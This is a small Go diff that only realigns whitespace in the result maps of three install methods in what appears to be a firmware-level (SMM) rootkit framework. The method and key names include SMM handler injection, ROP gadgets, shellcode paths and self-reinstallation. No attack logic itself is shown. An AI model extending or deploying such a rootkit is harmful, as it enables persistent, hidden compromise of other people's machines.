@@ -58,7 +58,7 @@ func (m *HandlerInjectMethod) Install(config *RootkitConfig) (*RootkitResult, er
 		Technique: TechniqueHandlerInject,
 		Layer:     LayerSMM,
 		Details: map[string]string{
-			"smm_path":    smmPath,
+			"smm_path":     smmPath,
 			"handler_path": handlerPath,
 			"region_start": fmt.Sprintf("0x%x", smmRegion.Start),
 			"region_size":  fmt.Sprintf("0x%x", smmRegion.Size),
@@ -214,11 +214,11 @@ func (m *ROPChainMethod) Install(config *RootkitConfig) (*RootkitResult, error) 
 		Technique: TechniqueROPChain,
 		Layer:     LayerSMM,
 		Details: map[string]string{
-			"kernel_path":   kernelPath,
-			"backup_path":   backupPath,
-			"gadget_path":   gadgetPath,
+			"kernel_path":    kernelPath,
+			"backup_path":    backupPath,
+			"gadget_path":    gadgetPath,
 			"shellcode_path": shellcodePath,
-			"gadgets_found": fmt.Sprintf("%d", len(gadgets)),
+			"gadgets_found":  fmt.Sprintf("%d", len(gadgets)),
 		},
 	}, nil
 }
@@ -354,9 +354,9 @@ done
 		Technique: TechniqueSMMSelfReinstall,
 		Layer:     LayerSMM,
 		Details: map[string]string{
-			"smm_path":     smmPath,
-			"backup_path":  backupPath,
-			"script_path":  scriptPath,
+			"smm_path":    smmPath,
+			"backup_path": backupPath,
+			"script_path": scriptPath,
 		},
 	}, nil
 }
